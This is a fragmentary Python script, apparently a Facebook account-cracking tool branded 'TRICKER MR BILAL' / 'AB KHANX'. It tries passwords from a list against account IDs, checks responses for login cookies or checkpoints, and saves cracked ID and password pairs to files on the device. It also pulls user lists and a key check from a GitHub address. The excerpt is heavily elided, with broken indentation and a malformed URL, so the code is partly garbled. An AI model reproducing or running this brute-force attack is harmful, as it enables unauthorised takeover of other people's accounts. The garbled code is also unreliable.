...
try:
	...
	os.system('python BILAL.py')
android_models=[]
try:
	xx = requests.get('https://github.com/lalaImranbaloch/lala-ji/new/main').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/lalaImranbaloch/lala-ji/new/main').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://https://github.com/lalaImranbaloch/lala-ji/new/main').text
		ua=open('.bbnew.txt','w')
...
\033[1;93m--------------------------------------------------
  \033[1;32mF4C3B00K  : TRICKER MR BILAL
  \033[1;32mY0UTUB3   : NI HA
  \033[1;32mV3RS10N   : 0.1
  \033[1;32m0WN3R     : BILAL
--------------------------------------------------
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/AB KHANX.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/AB KHANX.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/AB KHANX.txt\033[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [AB KHANX-OK] %s | %s'%(ids,pas))
				open('/sdcard/AB KHANX-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [AB KHANX-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AB KHANX-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AB KHANX-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/AB KHANX-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [BILAL-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [BILAL-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/lalaImranbaloch/lala-ji/new/main').text
